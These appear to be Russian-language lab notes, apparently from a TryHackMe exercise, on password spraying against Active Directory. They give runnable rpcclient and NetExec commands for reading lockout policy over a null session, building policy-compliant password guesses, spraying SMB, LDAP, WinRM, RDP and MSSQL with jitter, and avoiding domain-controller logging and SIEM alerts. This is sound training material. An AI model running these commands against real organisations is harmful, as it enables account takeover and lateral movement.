# PASSWORD SPRAYING — ПОДБОР ПАРОЛЯ ПО МНОГИМ ПОЛЬЗОВАТЕЛЯМ

## Отличие от Brute Force

Brute Force:
- Один пользователь → много паролей
- БЫСТРО вызовет блокировку аккаунта

Password Spraying:
- Один пароль → много пользователей
- Медленно, но безопасно для атакующего
- Не триггерит блокировку (если не превышать порог)

## Почему это работает

Люди используют предсказуемые пароли:
- SeasonYear! (Summer2025!)
- Название компании + число (MegaCorp01!)
- Дефолтный пароль при онбординге
- Простые комбинации типа Password123, Welcome1, Qwerty123


# ЭТАП 1: ПОЛУЧЕНИЕ PASSWORD POLICY (без учетки)

Перед атакой нужно узнать, сколько неудачных попыток блокируют аккаунт.

## Через rpcclient (null session)

rpcclient -U "" TARGET_IP -N
rpcclient $> getdompwinfo

Что показывает:
- min_password_length — минимальная длина пароля
- password_properties: 0x00000001 — DOMAIN_PASSWORD_COMPLEX
- lockout_threshold — сколько попыток до блокировки
- lockout_duration — сколько длится блокировка
- lockout_reset_counter — через сколько минут сбрасывается счетчик

## Через CrackMapExec (NetExec)

crackmapexec smb TARGET_IP --pass-pol

Пример вывода:
SMB         10.211.11.10    445    DC               Account Lockout Threshold: 10
SMB         10.211.11.10    445    DC               Reset Account Lockout Counter: 30 minutes
SMB         10.211.11.10    445    DC               Locked Account Duration: 30 minutes
SMB         10.211.11.10    445    DC               Minimum password length: 12

## Интерпретация политики

Если Lockout Threshold = 5, Reset Counter = 30 минут:
- за 30 минут можно пробовать НЕ БОЛЕЕ 4 паролей на каждого пользователя
- Если нет учетки для проверки — консервативно: 1 пароль за раз с паузой


# ЭТАП 2: ПОНИМАНИЕ COMPLEXITY POLICY

Windows требует 3 из 4 условий для пароля при включенной сложности:

1. Заглавные буквы (A-Z)
2. Строчные буквы (a-z)
3. Цифры (0-9)
4. Специальные символы (!@#$%^&*)

Дополнительные ограничения:
- Пароль НЕ должен содержать имя пользователя
- Пароль НЕ должен содержать части полного имени (более 2 символов подряд)

## Составление списка паролей под политику

Пример для компании, где известно, что использовался пароль "Password" (из утечки или OSINT):

Password!        (спецсимвол, нет цифр)
Password1        (цифра, нет спецсимвола)
Password1!       (цифра + спецсимвол)
P@ssword         (замена a на @)
Pa55word1        (цифры внутри)

Другие популярные варианты:
- Summer2025!
- CompanyName01!
- Welcome1!
- Qwerty123!
- SeasonYear


# ЭТАП 3: ПОДГОТОВКА СПИСКА ПОЛЬЗОВАТЕЛЕЙ

## Очистка вывода kerbrute

grep "VALID USERNAME" valid_users.txt | awk '{print $NF}' | sed 's/@thm.loc//' > clean_users.txt

## Формат файла users.txt

Одно имя пользователя на строку:
Administrator
gerald.burgess
nigel.parsons
guy.smith
...


# ЭТАП 4: ВЫПОЛНЕНИЕ PASSWORD SPRAYING

## Базовая команда с NetExec (CrackMapExec)

nxc smb <TARGET_IP> -u users.txt -p 'MegaCorp01!' --continue-on-success

Параметры:
- smb — протокол (также можно ldap, rdp, winrm, mssql)
- -u — файл с именами пользователей
- -p — один пароль для проверки
- --continue-on-success — продолжать после нахождения валидной пары

## Цель для спрея

Можно спреить на:
- DC (контроллер домена) — но привлекает внимание
- Рабочую станцию (WRK) — тише, безопаснее
- Серверы
- Другие SMB сервисы

## Пример команды на рабочую станцию

nxc smb 10.211.11.20 -u users.txt -p passwords.txt

---

# ЭТАП 5: ИНТЕРПРЕТАЦИЯ РЕЗУЛЬТАТОВ

[+] — успех! Найдена валидная пара логин:пароль

[-] STATUS_LOGON_FAILURE — неверный пароль для этого пользователя

[-] STATUS_ACCOUNT_DISABLED — учетка отключена (не триггерит блокировку)

[-] STATUS_ACCOUNT_LOCKED_OUT — учетка заблокирована! ОСТАНОВИТЬ АТАКУ!

(Pwn3d!) — пользователь локальный администратор на цели

---

# ЭТАП 6: БЕЗОПАСНЫЙ SPRAYING (избежать блокировок)

## Добавить случайную задержку между попытками

nxc smb <IP_DC> -u users.txt -p 'Password123!' --continue-on-success --jitter 2-5

--jitter 2-5 — задержка от 2 до 5 секунд между попытками

## Если нет информации о lockout policy

- Начинай с 1 пароля на всех пользователей
- Жди минимум 30 минут перед следующим паролем
- Наблюдай за появлением STATUS_ACCOUNT_LOCKED_OUT


# ДРУГИЕ ПРОТОКОЛЫ ДЛЯ PASSWORD SPRAYING

NetExec поддерживает не только SMB:

nxc ldap <IP_DC> -u users.txt -p 'Password123!'   (порт 389)
nxc winrm <IP_DC> -u users.txt -p 'Password123!'  (порт 5985/5986)
nxc rdp <IP_DC> -u users.txt -p 'Password123!'    (порт 3389)
nxc mssql <IP_SQL> -u users.txt -p 'Password123!' (порт 1433)

LDAP — тише (меньше логов)
WinRM — полезен если есть удаленное управление
RDP — чаще всего имеет другие политики блокировки


# ЭТАП 7: ЧТО ДЕЛАТЬ С НАЙДЕННЫМИ УЧЕТКАМИ

1. Записать их в файл compromised_credentials.txt
2. Попробовать использовать для доступа к другим сервисам
3. Использовать для дальнейшей enum (перечисление домена)
4. Попробовать повысить привилегии (Privilege Escalation)
5. Использовать для lateral movement (движение по сети)

Формат записи найденного:
domain\username:password
tryhackme.loc\alice.moore:MegaCorp01!


# КЛЮЧЕВЫЕ ВЫВОДЫ

1. Password spraying — атака "один пароль на многих пользователей"
2. Перед атакой — узнать lockout policy (через rpcclient или crackmapexec)
3. Учитывать password complexity при составлении списка паролей
4. Спреить лучше на рабочие станции, а не на DC
5. Использовать --continue-on-success, чтобы найти всех пользователей с одинаковым паролем
6. Добавлять --jitter для случайной задержки
7. При появлении STATUS_ACCOUNT_LOCKED_OUT — немедленно остановиться


# БЫСТРАЯ ШПАРГАЛКА

# Узнать политику (без учетки)
rpcclient -U "" IP -N → getdompwinfo
crackmapexec smb IP --pass-pol

# Password spraying на SMB
nxc smb IP_WRK -u users.txt -p passwords.txt --continue-on-success --jitter 2-5

# Password spraying на LDAP (тише)
nxc ldap IP_DC -u users.txt -p passwords.txt --continue-on-success

# Проверить одну учетку
nxc smb IP -u username -p password

# Проверить учетку с доменом
nxc smb IP -d DOMAIN -u username -p password


# CrackMapExec vs NetExec

CrackMapExec (cme/crackmapexec) — старый инструмент, не поддерживается с сентября 2023.
NetExec (nxc) — новый форк, активное развитие, замена CME.

Синтаксис практически одинаковый. В новых материалах используй nxc.

# Почему спрей на рабочую станцию (WRK) лучше, чем на DC

1. Меньше логов на DC (DC не видит неудачные попытки к WRK)
2. Меньше шансов вызвать блокировку
3. DC имеет усиленный мониторинг (SIEM, алерты)
4. Атака тише и менее заметна

Правильно: спрей на WRK, потом с найденными кредами — на DC.